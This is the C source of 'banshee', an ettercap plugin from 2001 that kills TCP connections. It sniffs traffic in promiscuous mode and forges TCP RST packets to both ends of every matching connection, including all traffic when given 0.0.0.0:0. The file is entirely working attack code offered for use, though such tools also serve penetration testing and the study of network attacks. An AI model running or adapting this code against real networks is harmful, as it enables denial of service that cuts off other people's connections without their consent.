/*
    banshee -- ettercap plugin -- kill any connetions

    Copyright (C) 2001  NaGoR

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: banshee.c,v 1.6 2002/02/10 10:07:01 alor Exp $
*/

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

#include "../../src/include/ec_main.h"
#include "../../src/include/ec_plugins.h"
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_inet.h"
#include "../../src/include/ec_inet_forge.h"

typedef struct killing
{
   int source_ip;
   int dest_ip;
   short source_port;
   short dest_port;
} KILLING;


// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
int banshee(void *dummy);
int Banshee_ToBeKilled(int source, int psource, int dest, int pdest, KILLING *data);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "They kill without discretion...",
   plug_version:     15,
   plug_type:        PT_EXT,
   hook_point:       HOOK_NONE,
   hook_function:    &banshee,
};

//==================================

int Plugin_Init(void *params)
{
   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   return 0;
}

// =================================

int banshee(void *dummy)
{
   int sock, MTU, len;
   ETH_header *eth;
   IP_header *ip;
   TCP_header *tcp;
   char source[25], dest[25];
   char source_ip[20], dest_ip[20];
   u_long IPS=0, IPD=0;
   int PS=0, PD=0;
   KILLING data;
   char c[1]="";
   char *buf;
   char cont[10];


   if (!strcmp(Host_Source.ip, ""))
   {
      Plugin_Output("\nEnter a source ip:port (0.0.0.0:0 for all): ");
      Plugin_Input(source, 25, P_BLOCK);
      sscanf(source, "%16[^:]:%d", source_ip, &PS);
   }
   else
   {
      strlcpy(source_ip, Host_Source.ip, sizeof(source_ip));
   }

   if (!strcmp(Host_Dest.ip, ""))
   {
      Plugin_Output("\nEnter a dest ip:port (0.0.0.0:0 for all): ");
      Plugin_Input(dest, 25, P_BLOCK);
      sscanf(dest, "%16[^:]:%d", dest_ip, &PD);
   }
   else
   {
      strlcpy(dest_ip, Host_Dest.ip, sizeof(dest_ip));
   }

   IPS = inet_addr(source_ip);
   IPD = inet_addr(dest_ip);

   memset(cont, 0, 10);

   Plugin_Output("\nAre you sure you want to kill from %s:%d to ", int_ntoa(IPS), PS);
   Plugin_Output("%s:%d ? (yes/no) ", int_ntoa(IPD), PD);
   Plugin_Input(cont, 5, P_BLOCK);
   if (strncmp(cont, "yes", 3))  // not sure... ;)
   {
      Plugin_Output("\nIt is safe!  for now...\n");
      return 0;
   }

   Plugin_Output("\nKilling all connection from %s:%d to ", int_ntoa(IPS), PS);
   Plugin_Output("%s:%d ... (pres return to stop)\n\n", int_ntoa(IPD), PD);

   PS = htons(PS);
   PD = htons(PD);

   sock = Inet_OpenRawSock(Options.netiface);
   Inet_GetIfaceInfo(Options.netiface, &MTU, NULL, NULL, NULL);

   if (Options.normal || number_of_connections == 0)  // form command line or in host list interface...
      Inet_SetPromisc(Options.netiface);

   fcntl(sock,F_SETFL,O_NONBLOCK);

   buf = Inet_Forge_packet( MTU );

   loop
   {
      memset(&data, 0, sizeof(KILLING));
      memset(buf, 0, MTU);

      len = Inet_GetRawPacket(sock, buf, MTU, NULL);

      if (len > 0)
      {
         eth = (ETH_header *)buf;

         if ( ntohs(eth->type) == ETH_P_IP )
         {
            ip = (IP_header *)(eth+1);

            data.source_ip = ip->source_ip;
            data.dest_ip = ip->dest_ip;

            if ( ip->proto == IPPROTO_TCP)
            {
               unsigned char *payload;
               int datalen;
               tcp = (TCP_header *) ((int)ip + ip->h_len * 4);

               payload = (char *)((int)tcp + tcp->doff * 4);
               datalen = (int)ip + ntohs(ip->t_len) - (int)payload;

               data.source_port = tcp->source;
               data.dest_port = tcp->dest;

               if (Banshee_ToBeKilled(IPS, PS, IPD, PD, &data))
               {
                  u_char *kbuf;

                  kbuf = Inet_Forge_packet( ETH_HEADER + IP_HEADER + TCP_HEADER );

                  Inet_Forge_ethernet( kbuf, eth->dest_mac, eth->source_mac, ETH_P_IP );

                  Inet_Forge_ip( kbuf + ETH_HEADER, ip->dest_ip, ip->source_ip, TCP_HEADER, 0xbadc, 0, IPPROTO_TCP );

                  Inet_Forge_tcp( kbuf + ETH_HEADER + IP_HEADER, ntohs(tcp->dest),
                                                                 ntohs(tcp->source),
                                                                 ntohl(tcp->ack_seq),
                                                                 ntohl(tcp->seq) + datalen,
                                                                 TH_RST,
                                                                 0, 0 );

                  Inet_SendRawPacket(sock, kbuf, ETH_HEADER + IP_HEADER + TCP_HEADER );

                  Inet_Forge_ethernet( kbuf, eth->source_mac, eth->dest_mac, ETH_P_IP );

                  Inet_Forge_ip( kbuf + ETH_HEADER, ip->source_ip, ip->dest_ip, TCP_HEADER, 0xbadc, 0, IPPROTO_TCP );    // to dest

                  Inet_Forge_tcp( kbuf + ETH_HEADER + IP_HEADER, ntohs(tcp->source),
                                                                 ntohs(tcp->dest),
                                                                 ntohl(tcp->seq) + datalen,
                                                                 ntohl(tcp->ack_seq),
                                                                 TH_RST,
                                                                 0, 0 );

                  Inet_SendRawPacket(sock, kbuf, ETH_HEADER + IP_HEADER + TCP_HEADER );

                  Plugin_Output("Killed %s:%d to", int_ntoa(ip->source_ip), ntohs(tcp->source) );
                  Plugin_Output(" %s:%d \n", int_ntoa(ip->dest_ip), ntohs(tcp->dest) );

                  Inet_Forge_packet_destroy( kbuf );
               }
            }
         }
      }

      if (Plugin_Input(c, 1, P_NONBLOCK))
      {
         Plugin_Output("Exiting... \n");
         Inet_Forge_packet_destroy( buf );
         Inet_CloseRawSock(sock);
         break;
      }
   } // end loop

   return 0;
}


int Banshee_ToBeKilled(int source, int psource, int dest, int pdest, KILLING *data)
{
   char s=0, ps=0, d=0, pd=0;

   if (psource == 0) ps = 1;
   if (pdest == 0) pd = 1;
   if (source == 0) s = 1;
   if (dest == 0) d = 1;

   if (s || source == data->source_ip)
      if (ps || psource == data->source_port)
      {  s = 1;   ps = 1;  }

   if (s || source == data->dest_ip)
      if (ps || psource == data->dest_port)
      {  s = 1;   ps = 1;  }

   if (d || dest == data->source_ip)
      if (pd || pdest == data->source_port)
      {  d = 1;   pd = 1;  }

   if (d || dest == data->dest_ip)
      if (pd || pdest == data->dest_port)
      {  d = 1;   pd = 1;  }

   return ( s && ps && d && pd );
}


/* EOF */
